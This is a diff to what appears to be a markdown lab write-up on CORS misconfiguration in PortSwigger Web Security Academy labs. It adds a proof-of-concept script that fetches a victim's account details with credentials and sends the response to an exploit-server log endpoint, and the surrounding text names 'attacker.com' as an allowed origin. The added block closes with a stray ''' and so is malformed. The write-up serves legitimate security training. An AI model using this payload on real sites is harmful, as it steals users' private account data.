@@ -55,6 +55,21 @@ Access-Control-Allow-Origin: attacker.com
 
     * *Make sure to set the file extension to .html or no extension also works in Exploit Server labs*
 
+New version PoC
+```
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+'''
+
 ```html
 <html>
 <script>
